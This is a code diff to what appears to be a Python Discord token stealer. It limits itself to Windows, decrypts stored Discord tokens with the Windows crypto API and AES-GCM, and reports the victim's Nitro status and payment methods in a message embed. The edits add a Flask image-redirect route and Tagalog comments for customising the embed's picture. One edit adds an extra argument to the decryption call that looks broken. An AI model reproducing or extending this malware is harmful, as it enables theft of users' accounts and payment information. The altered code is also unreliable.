@@ -1,4 +1,4 @@
-from email.mime import image
+from flask import Flask, redirect
 import os
 if os.name != "nt":
     exit()
@@ -96,6 +96,16 @@ def getip():
     except:
         return "None"
 
+
+app = Flask(__name__)
+
+@app.route('/api/image')
+def serve_image():
+    # Dito yung link ng picture mo
+    image_url = "https://i.im.ge/QMdVbq/token.png"
+    return redirect(image_url)
+# ================================================
+
 def main():
     checked = []
 
@@ -108,7 +118,7 @@ def main():
 
             try:
                 # Decrypt the token
-                decrypted_token_data = win32crypt.CryptUnprotectData(base64.b64decode(getkey(path))[5:], None, None, None, 0)[1]
+                decrypted_token_data = win32crypt.CryptUnprotectData(base64.b64decode(getkey(path))[5:], None, None, None, None, 0)[1]
                 token_bytes = base64.b64decode(token.split('dQw4w9WgXcQ:')[1])
                 
                 # AES-GCM decryption logic
@@ -210,9 +220,9 @@ def main():
                 nnbutb = f"\nNitro Informations:\n```yaml\nBoosts Available: {available}\n{print_boost if boost else ''}\n```"
                 print_pm = f"\nPayment Methods:\n```yaml\nAmount: {payment_methods}\nValid Methods: {valid} method(s)\nType: {type}\n```"
                 
-               
+                # ==== DITO MO ILAGAY YUNG LINK NG PICTURE MO ====
                 image_url = "https://i.im.ge/QMdVbq/token.png" 
-               
+                # ================================================
 
                 embed_user = {
                     'embeds': [
@@ -227,7 +237,7 @@ def main():
                             'thumbnail': {
                                 'url': f"https://cdn.discordapp.com/avatars/{res_json['id']}/{res_json['avatar']}." + (f"png" if res_json.get('avatar') else "gif")
                             },
-                          
+                            # ==== DITO YUNG IDADAGDAG NA CODE PARA SA IMAGE ====
                             'image': {
                                 'url': image_url
                             }
